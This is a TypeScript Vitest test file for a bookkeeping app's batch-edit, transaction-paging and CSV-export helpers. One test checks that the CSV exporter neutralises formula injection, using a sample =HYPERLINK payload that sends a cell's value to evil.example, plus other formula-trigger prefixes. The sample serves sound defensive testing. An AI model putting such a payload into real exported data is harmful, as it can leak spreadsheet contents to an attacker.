import { describe, expect, it } from "vitest";
import { BATCH_MAX, batchErrorMessage, chunkIds, fetchAllTxns, postBatchEdit, visibleSelection } from "../app/books-batch";
import { csvText } from "../app/books-csv";

const ids = (n: number) => Array.from({ length: n }, (_, i) => `t${i}`);
const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status });

describe("visibleSelection", () => {
  it("keeps only selected ids that are on screen, in row order", () => {
    const rows = [{ transaction_id: "a" }, { transaction_id: "b" }, { transaction_id: "c" }];
    expect(visibleSelection(new Set(["c", "x", "a"]), rows)).toEqual(["a", "c"]);
  });
});

describe("chunkIds", () => {
  it("splits into runs of at most BATCH_MAX", () => {
    expect(chunkIds(ids(1200)).map((c) => c.length)).toEqual([500, 500, 200]);
    expect(chunkIds([])).toEqual([]);
    expect(BATCH_MAX).toBe(500);
  });
});

describe("postBatchEdit", () => {
  it("posts every id, 500 at a time, with the patch", async () => {
    const bodies: any[] = [];
    const r = await postBatchEdit(async (_url, init) => {
      bodies.push(JSON.parse(String(init?.body)));
      return json({ updated: 1 });
    }, ids(1200), { book_category: "6250 Utilities" });
    expect(r).toEqual({ ok: true });
    expect(bodies.map((b) => b.transaction_ids.length)).toEqual([500, 500, 200]);
    expect(bodies[0]).toMatchObject({ action: "batch_update", book_category: "6250 Utilities" });
  });

  it("stops at the first refusal and says how far it got", async () => {
    let n = 0;
    const r = await postBatchEdit(async () => (++n === 2 ? json({ error: "bad_selection" }, 400) : json({})), ids(1200), { type_override: "transfer" });
    expect(n).toBe(2);
    expect(r).toEqual({ ok: false, done: 500, message: "Too many rows selected (at most 500 at a time). 500 of 1200 were saved." });
  });

  it("names a view-only refusal", async () => {
    const r = await postBatchEdit(async () => json({ error: "forbidden" }, 403), ids(2), { name: "x" });
    expect(r).toEqual({ ok: false, done: 0, message: "You have view-only access to Books." });
    expect(batchErrorMessage(500)).toBe("Couldn't apply that batch edit.");
  });
});

describe("fetchAllTxns", () => {
  it("pages by 500 until a short page", async () => {
    const urls: string[] = [];
    const rows = await fetchAllTxns<{ id: number }>(async (url) => {
      urls.push(url);
      const offset = Number(new URL(url, "http://x").searchParams.get("offset"));
      const size = offset < 1000 ? 500 : 168;
      return json({ transactions: Array.from({ length: size }, (_, i) => ({ id: offset + i })) });
    }, new URLSearchParams({ report: "transactions", q: "Amazon" }));
    expect(rows).toHaveLength(1168);
    expect(urls).toHaveLength(3);
    expect(urls[2]).toBe("/api/books/data?report=transactions&q=Amazon&limit=500&offset=1000&summary=0");
  });

  it("throws the server's message, or the fallback", async () => {
    await expect(fetchAllTxns(async () => json({}, 500), new URLSearchParams(), "Couldn't load this vendor.")).rejects.toThrow(
      "Couldn't load this vendor."
    );
  });
});

describe("csvText", () => {
  it("neutralises cells a spreadsheet would run as a formula", () => {
    expect(csvText('=HYPERLINK("http://evil.example/?x="&A1,"Click")')).toBe(`"'=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")"`);
    expect(csvText("+1")).toBe(`"'+1"`);
    expect(csvText("-cmd")).toBe(`"'-cmd"`);
    expect(csvText("@SUM(1)")).toBe(`"'@SUM(1)"`);
    expect(csvText("\tx")).toBe(`"'\tx"`);
  });

  it("quotes plain text and blanks as before", () => {
    expect(csvText("ZELLE FROM A")).toBe(`"ZELLE FROM A"`);
    expect(csvText(null)).toBe(`""`);
    expect(csvText('say "hi"')).toBe(`"say ""hi"""`);
  });
});
